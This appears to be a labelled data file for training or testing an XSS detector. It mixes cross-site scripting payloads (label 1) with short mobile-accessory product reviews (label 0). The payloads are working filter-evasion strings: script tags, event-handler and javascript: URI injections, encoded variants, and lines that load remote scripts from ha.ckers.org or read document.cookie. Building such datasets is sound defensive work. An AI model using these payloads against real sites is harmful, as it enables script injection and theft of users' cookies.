1	<img lowsrc="javascript:alert('xss')">
1	\";alert('xss');//
1	<script src=http://ha.ckers.org/xss.js></script>
1	<iMg LOwSrc="JaVaSCripT:alerT('Xss')">
0	Excellent dual-purpose headset.
1	<IMG SRC="LIVESCRIPT:[CODE]">
0	If I take a picture, the battery drops a bar, and starts beeping, letting me know its dieing.
1	<IMG SRC=" &#14;  JAVASCRIPT:ALERT('XSS');">
0	I can hear while I'm driving in the car, and usually don't even have to put it on it's loudest setting.
1	<img src=/ onerror="alert(string.fromcharcode(88,83,83))"></img>
1	<IMG DYNSRC="JAVASCRIPT:ALERT('XSS')">
1	<script/src="http://ha.ckers.org/xss.js"></script>
1	<body onload=alert('xss')>
1	<SCRIPT SRC=HTTP://HA.CKERS.ORG/XSS.JS></SCRIPT>
1	<IMG SRC="JAV&#X0A;ASCRIPT:ALERT('XSS');">
1	<iframe src=http://ha.ckers.org/scriptlet.html <
1	<img src="javascript:alert('xss')"
0	Best headset ever!!!.
1	</title><script>alert("xss");</script>
1	<IMG SRC=JAVASCRIPT:ALERT('XSS')>
1	<INPUT TYPE="IMAGE" SRC="JAVASCRIPT:ALERT('XSS');">
1	<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
1	<A ONMOUSEOVER=ALERT(DOCUMENT.COOKIE)>XXS LINK</A>
1	<IMg SRc="JaV&#X0A;asCRiPT:AleRt('xsS');">
1	<img src="jav&#x0a;ascript:alert('xss');">
1	<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
1	<IMG SRc=jAVAscRIPT:aleRt(strInG.fROmCharcodE(88,83,83))>
1	<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
0	It didn't charge for me.
1	<IMG SRC=javascript:alert('XSS')>
1	<IMG DYNSRC="javascript:alert('XSS')">
1	<img dynsrc="javascript:alert('xss')">
1	<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
0	But despite these few flaws, this case is of exceptional quality and well worth the additional costs of owning an official OEM product.
0	but it is great, i would really recommend it
label	sentence
0	Works for me.
1	" onfocus="alert(1)" name="bounty
1	<a onmouseover=alert(document.cookie)>xxs link</a>
0	This is the phone to get for 25.... I just bought my S7a and all I can say is WOW!
0	cool phone.
0	I was very pleased to see that I could replace my well travled swivel holster for my Blackberry flip.
1	<img src=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
1	'';!--"<XSS>=&{()}
0	It always cuts out and makes a beep beep beep sound then says signal failed.
0	Saggy, floppy piece of junk.
0	Very unreliable service from T-mobile !
0	When it opens, the battery connection is broken and the device is turned off.
1	<iMg ONmOUseOVER="aLeRt('XXS')">
0	I am pairing this with my iphone, and I could not be happier with it so far.
1	<imG dyNSrC="JAVaSCRiPt:aLErT('Xss')">
1	<svg><x><script>alert(1)</x>
1	<IMG ONMOUSEOVER="ALERT('XXS')">
0	The cutouts and buttons are placed perfectly.
1	<IMG SRC=# ONMOUSEOVER="ALERT('XXS')">
1	<SCRIPT/SRC="HTTP://HA.CKERS.ORG/XSS.JS"></SCRIPT>
0	You get extra minutes so that you can carry out the call and not get cut off."
1	<SCRIPT SRC=//HA.CKERS.ORG/.J>
1	<body background="javascript:alert('xss')">
1	<BODY BACKGROUND="JAVASCRIPT:ALERT('XSS')">
1	</TITLE><SCRIPT>alert("XSS");</SCRIPT>
0	I have tried these cables with my computer and my iPod and it works just fine.
0	Very much disappointed with this company.
0	Otherwise, easy to install and use, clear sound.
0	Just reading on the specs alone makes you say WOW.
0	I like the fact that it rests lightly against your ear, rather than inside.
1	<script>alert(1)</script>
1	<SVG/ONLOAD=LOCATION=`JAVAS`+`CRIPT:ALE`+`RT%2`+`81%2`+`9`;//
0	I kept catching the cable on the seat and I had to pull the phone out to turn it on an off.
1	<IMG SRC=/ ONERROR="ALERT(STRING.FROMCHARCODE(88,83,83))"></IMG>
1	<ScRiPT sRc=http://ha.CkERs.ORG/xSS.jS></ScRIpT>
1	<img src="jav	ascript:alert('xss');">
0	Good show, Samsung.
1	<<SCRIPT>alert("XSS");//<</SCRIPT>
0	Nice case, feels good in your hands.
0	Very satisifed with that.
0	My sister has one also and she loves it.
0	Seller shipped quickly and much cheaper than the competitors.
1	<IMG srC="jAVAscRiPT:aLErT('xSs');">
0	The mic there is a joke, and the volume is quite low.
1	<style>li {list-style-image: url("javascript:alert('xss')");}</style><ul><li>xss</br>
0	WARNING - DO NOT BUY!!.
1	<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
1	<IMG SRC=# onmouseover="alert('xxs')">
1	<img src=javascript:alert('xss')>
1	<IMG LOWSRC="javascript:alert('XSS')">
1	<iframe src=http://ha.ckers.org/scriptlet.html <
1	<<SCRIPT>ALERT("XSS");//<</SCRIPT>
0	It is a joy to use.
0	This was utterly confusing at first, which caused me to lose a couple of very, very important contacts.
1	#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
0	Just does not work.
0	Logitech Bluetooth Headset is a !.
1	<<scRiPT>aLerT("xss");//<</sCRipT>
0	Happy so far!.
0	much better than the hard plastic cases.
1	'';!--"<XSS>=&{()}
1	" onfocus="alert(1)" name="bounty
0	It was quite comfortable in the ear.
1	<IMG SRC= onmouseover="alert('xxs')">
1	<IMG SRC="JAV&#X09;ASCRIPT:ALERT('XSS');">
1	<IMG SRC="jav&#x0D;ascript:alert('XSS');">
1	<ScRiPT/XSS Src="HtTP://HA.cKERS.Org/Xss.JS"></sCripT>
1	" ONFOCUS="ALERT(1)" NAME="BOUNTY
0	Bad Reception.
0	This is by far the worst purchase I've made on Amazon.
0	I really like this product over the Motorola because it is allot clearer on the ear piece and the mic.
1	<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
1	<Img """><ScRiPt>ALerT("xSS")</ScRipt>">
1	<BODY ONLOAD=ALERT('XSS')>
1	<img src=`jAvAscRiPt:aLERT("RsNAkE says, 'XSS'")`>
0	The headset fulfills my requirements so I am happy with my purchase.
0	Last time buying from you.
0	Great phone.
0	I'm returning them.
0	[...] down the drain because of a weak snap!
1	<a ONmOuseOvER=AlErt(DoCuMenT.COOKIE)>Xxs link</a>
1	<IMG SRC=JAVASCRIPT:ALERT('XSS')>
0	However, the keypads are so tinny that I sometimes reach the wrong buttons.
1	<iMg SRC= oNmOUsEOVer="aleRT('XXs')">
0	Does not work for listening to music with the cingular 825.
0	Motorola finally got the voice quality of a bluetooth headset right.
0	I have only had it for a few weeks, but so far, so good.
1	<IMG """><SCRIPT>ALERT("XSS")</SCRIPT>">
1	<IMG SRC=JAVASCRIPT:ALERT("XSS")>
1	<img src=javascript:alert(string.fromcharcode(88,83,83))>
0	A lot of websites have been rating this a very good phone and so do I.
1	<IMG SRC="JAV&#X0D;ASCRIPT:ALERT('XSS');">
0	It was a waste of my money. :D
1	<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
1	<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
1	<input type="image" src="javascript:alert('xss');">
1	<img src=javascript:alert("xss")>
0	It also had a new problem.
1	#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
1	<Img SRC="jAV	AscRiPT:AlerT('xSs');">
0	Used and dirty.
0	Good Quality.
1	<img src=# onmouseover="alert('xxs')">
0	Would recommend this item.
1	<SVG><X><SCRIPT>ALERT(1)</X>
1	<img src=`javascript:alert("rsnake says, 'xss'")`>
0	Buttons are too small.
0	Not nearly as good looking as the AMAZON picture makes it look.
1	<SCRIPT/XSS SRC="HTTP://HA.CKERS.ORG/XSS.JS"></SCRIPT>
1	<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
0	Does not charge the Cingular (ATT) 8525 phone.
0	Just really good.. So far, probably the best BT headset I have ever had.
1	<iMg Src=# OnmOuseOVer="ALerT('xxS')">
0	Poor Reliability.
1	<sTYlE>Li {LIsT-StYLE-IMAge: Url("jaVAscRipT:ALErT('xss')");}</styLe><UL><Li>xss</Br>
1	<IMG SRc="jaV&#X09;AsCrIPT:ALeRT('xsS');">
0	Terrible product, and waste of money!
1	'';!--"<XSS>=&{()}
1	<script>alert(1)</script>
0	(It works!)
1	<img src="jav&#x09;ascript:alert('xss');">
1	<img src=" &#14;  javascript:alert('xss');">
1	<BodY OnlOAD=alERT('XSS')>
1	<imG SrC=/ oNERroR="ALErT(StRINg.fROMcHARCodE(88,83,83))"></IMg>
0	While I managed to bend the leaf spring back in place, the metal now has enough stress that it will break on the next drop.
1	<img src= onmouseover="alert('xxs')">
0	I does not maintain a connection with the computer while it is on my lap.
1	<IMG SRC="javascript:alert('XSS')"
1	<script/xss src="http://ha.ckers.org/xss.js"></script>
0	It seems completely secure, both holding on to my belt, and keeping the iPhone inside.
1	&#39;&#88;&#83;&#83;&#39;&#41;>
1	<BOdy oNLoAD!#$%&()*~+-_.,:;?@[/|\]^`=ALert("xss")>
0	Works fine. :D
1	\";ALERT('XSS');//
1	<BODY ONLOAD!#$%&()*~+-_.,:;?@[/|\]^`=ALERT("XSS")>
1	<IMG SRC=javascript:alert("XSS")>
1	<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
1	<img src=&#x6a&#x61&#X76&#x61&#X73&#X63&#x72&#x69&#X70&#x74&#X3A&#X61&#X6c&#X65&#X72&#X74&#x28&#X27&#X58&#X53&#X53&#X27&#X29>
1	<IMG SRC="jav&#x09;ascript:alert('XSS');">
1	<SCRIPT SRC=HTTP://HA.CKERS.ORG/XSS.JS?< B >
1	<img onmouseover="alert('xxs')">
1	<svg><x><script>alert(1)</x>
1	<script src=//ha.ckers.org/.j>
0	These products cover up the important light sensor above the ear outlet.
1	<IMG SRC="jav	ascript:alert('XSS');">
0	Leopard Print is wonderfully wild!.
0	Never got it!!!!!
0	This product is very High quality Chinese CRAP!!!!!!
1	<IMG SRC="JAV	ASCRIPT:ALERT('XSS');">
1	<SCRIPT SRC=//ha.ckers.org/.j>
0	As I said above....PRETTY USELESS!
1	<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
1	<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
1	<IMG SRC='VBSCRIPT:MSGBOX("XSS")'>
1	<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
1	" oNFOcus="AlERT(1)" Name="BOUntY
1	<SCRIPT>ALERT(1)</SCRIPT>
1	<iMG SrC=JAvaScRipT:AlErT("xsS")>
1	<IMG SRC="JAVASCRIPT:ALERT('XSS')"
0	I have had mine for about a year and this Christmas I bought some for the rest of the family.
1	<IMG SRC=JAVASCRIPT:ALERT(STRING.FROMCHARCODE(88,83,83))>
0	How stupid is that?
0	I bought two of them and neither will charge.
0	It is easy to turn on and off when you are in the car and the volume controls are quite accessable.
1	</Title><ScRiPt>Alert("xss");</scRIPT>
1	<iMG SrC="jav&#x0d;asCRIpt:aleRT('xss');">
1	<scRiPt>AlERT(1)</ScRIPT>
0	So I had to take the battery out of the phone put it all back together and then restart it.
0	Everything about this product is wrong.First
0	The only good thing was that it fits comfortably on small ears.
0	Excellent product for the price.
1	<sVG/onLoAD=lOCAtion=`JaVas`+`cRipt:AlE`+`rT%2`+`81%2`+`9`;//
1	<BODY ONLOAD=alert('XSS')>
1	&#39;&#88;&#83;&#83;&#39;&#41;>
1	<IMG LOWSRC="JAVASCRIPT:ALERT('XSS')">
1	<imG SrC='VbsCripT:msGboX("Xss")'>
1	<IMG SRC=&#X6A&#X61&#X76&#X61&#X73&#X63&#X72&#X69&#X70&#X74&#X3A&#X61&#X6C&#X65&#X72&#X74&#X28&#X27&#X58&#X53&#X53&#X27&#X29>
1	<BODY BACKGROUND="javascript:alert('XSS')">
1	<ifRAme sRC=hTTP://ha.cKeRS.org/SCriptlEt.HtmL <
1	<sCrIPT sRC=//hA.ckeRs.ORG/.J>
1	<IMG onmouseover="alert('xxs')">
0	Also makes i0	So I bought about  of these and saved alot of money.
1	#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
0	Don't trust their website and don't expect any helpful support.
1	<ImG SRc="JAVaSCRiPt:aleRt('xSS')"
1	<script src=http://ha.ckers.org/xss.js?< b >
0	I didn't want the clip going over the top of my ear, causing discomfort.
1	<img src=javascript:alert('xss')>
0	Makes it easier to keep up with my bluetooth when I'm not wearing it.
1	<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
1	\";alert('XSS');//
1	<ScrIPT/src="hTTp://ha.CkerS.OrG/xSS.Js"></sCRipT>
0	However, after about a year, the fliptop started to get loose and wobbly and eventually my screen went black and I couldn't receive and place calls.
0	Love it.. Great armband.
1	<body onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("xss")>
0	I received my headset in good time and was happy with it.
1	<SVG><SCRIPT>ALERT(1)<P>
1	<IMG SRC="jav&#x0A;ascript:alert('XSS');">
0	The speaker is of low quality so as making the ring tones sound very cheap.
0	The bottowm line...another worthless, cheap gimmick from Sprint.
0	Works good.
1	<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
1	<IMG SRC="JAVASCRIPT:ALERT('XSS');">
1	<img src="jav&#x0d;ascript:alert('xss');">
1	<BoDy bAckgroUNd="jAvascript:AlErT('Xss')">
1	<IMG srC=JAvASCriPt:AlERt('xSs')>
1	\";alerT('xSS');//
0	Problem is that the ear loops are made of weak material and break easily.
1	<IMG SRC=JaVaScRiPt:alert('XSS')>
1	&#39;&#88;&#83;&#83;&#39;&#41;>
1	<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
0	I love being able to use one headset for both by land-line and cell.
1	<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
0	It was that loud.Glad to say that the Plantronics 5 maintains a flawless connection to my cell and with no static during normal use.
1	<img src="javascript:alert('xss');">
1	<ImG SrC=" &#14;  JAvasCRIPT:AlErT('Xss');">
1	<A ONMOUSEOVER="ALERT(DOCUMENT.COOKIE)">XXS LINK</A>
0	This is an excellent tool, especially when paired with your phone's auto-answer.
1	<sVg><x><ScRipT>AlerT(1)</x>
0	I was very impressed with the price of the cases.
1	<IMG SRC="javascript:alert('XSS');">
0	The item received was Counterfeit.
0	It's been my choice headset for years.Great sound; good volume; good noise cancellation.
1	<SCrIPT sRc=HttP://HA.ckeRS.ORG/xSS.js?< b >
1	<img src='vbscript:msgbox("xss")'>
1	<img """><script>alert("xss")</script>">
1	<A ONMouSEovEr="ALERt(DOCuMENT.COOkIe)">xxS linK</a>
0	It looses connection to the phone even when it is within a couple feet between the two.
0	nice leather.
0	Couldn't figure it out
0	Excellent!.
0	I have read other's reviews here but I haven't had any problem with it.
0	The pairing of the two devices was so easy it barely took a couple minutes before I started making calls with the voice dialing feature.
0	Comfortable in my hand.
0	Don't buy this product - It fails!.
0	Not good enough for the price.
1	</TITLE><SCRIPT>ALERT("XSS");</SCRIPT>
0	Fits comfortably, came with three sizes of earbud tips.
0	It looks very nice.
1	<svg><script>alert(1)<p>
1	<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
0	So far it has worked like a charm.
1	<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
0	I had to purchase a different case.
1	'';!--"<xss>=&{()}
1	<IMG SRC="livescript:[code]">
1	<<script>alert("xss");//<</script>
1	&#39;&#88;&#83;&#83;&#39;&#41;>
1	<svg><script>alert(1)<p>
1	<IMG SRC=" &#14;  javascript:alert('XSS');">
1	<STYLE>LI {LIST-STYLE-IMAGE: URL("JAVASCRIPT:ALERT('XSS')");}</STYLE><UL><LI>XSS</BR>
1	<IMG SRC=`JAVASCRIPT:ALERT("RSNAKE SAYS, 'XSS'")`>
1	<a onmouseover=alert(document.cookie)>xxs link</a>
0	Having trouble with volume.
1	<iMG src="LiveScRIPt:[cODe]">
1	<imG SrC=jAvAsCRipT:aLeRT('xSS')>
1	<IMG SRC='vbscript:msgbox("XSS")'>
1	<a onmouseover="alert(document.cookie)">xxs link</a>
1	<IMG SRC= ONMOUSEOVER="ALERT('XXS')">
1	<INPut tyPe="IMagE" SRC="JaVasCRipt:alerT('xSS');">
1	<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
1	<IMG SRc=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
1	<img src="livescript:[code]">
0	I exchanged the sony ericson z5a for this and I'm pretty happy with that decision.
0	Terrible phone holder.
1	<SVG><scRipt>aLERT(1)<P>
0	But, in any case, the best part is, you can download these pictures to your laptop using IR, or even send pictures from your laptop to the phone.
1	<IFRAME SRC=HTTP://HA.CKERS.ORG/SCRIPTLET.HTML <
1	<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
1	<a onmouseover="alert(document.cookie)">xxs link</a>
1	#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
0	My phone sounded OK ( not great - OK), but my wife's phone was almost totally unintelligible, she couldn't understand a word being said on it.
0	This pair of headphones is the worst that I have ever had sound-wise.
